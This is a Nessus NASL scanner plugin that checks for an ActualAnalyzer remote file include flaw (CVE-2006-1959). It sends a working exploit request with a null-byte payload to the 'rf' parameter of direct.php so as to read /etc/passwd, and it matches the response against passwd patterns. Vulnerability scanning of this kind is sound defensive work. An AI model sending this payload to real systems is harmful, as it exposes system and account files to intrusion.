#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description :

The remote host is running ActualAnalyzer, a PHP-based tool for
monitoring web site traffic. 

The version of ActualAnalyzer installed on the remote host fails to
sanitize input to the 'rf' parameter of the 'direct.php' script before
using it in PHP 'require()' functions.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://www.securityfocus.com/archive/1/431351/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21244);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1959");
  script_bugtraq_id(17597);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"24778");

  script_name(english:"ActualAnalyzer rf Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd using ActualAnalyzer");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/actualanalyzer", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/direct.php?",
      "rf=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0common/.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (isnull(contents)) report = desc;
    else 
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the repeated contents of the file '/etc/passwd'\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
